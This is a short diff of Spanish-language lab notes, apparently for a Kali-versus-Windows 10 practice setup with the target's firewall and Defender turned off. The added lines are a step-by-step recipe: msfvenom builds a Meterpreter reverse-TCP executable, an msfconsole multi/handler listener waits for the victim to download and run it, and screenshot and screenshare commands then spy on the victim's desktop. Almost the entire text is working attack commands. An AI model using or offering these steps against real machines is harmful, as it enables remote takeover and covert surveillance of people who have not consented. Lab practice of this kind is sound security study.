@@ -1,4 +1,18 @@
 ++ PC1: Kali
-++ PC2: Windows 10 
+++ PC2: Windows 10 Pro x64
 
 ++ PC2 Firewall y Defender desactivado
+++ PC1 ip addr show (Muestra ip del kali)
+++ PC1 msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<ip_PC1> LPORT=445 -f exe > <nombre_archivo.exe>
+++ PC1 msfconsole 
+++ PC1 use exploit/multi/handler
+++ PC1 set lhost <ip_PC1>
+++ PC1 set lport 445
+++ PC1 set payload windows/x64/meterpreter_reverse_tcp 
+++ PC1 run
+++ PC2 debe descargar y ejecutar el programa
+++ PC1 Nos aparecerá un mensaje de sesion abierta
+++ PC1 screeshot (Nos permite tomar captura del escritorio de PC2)
+++ PC1 screenshare (Nos permite ver el escritorio de PC2 en tiempo real)
+
+
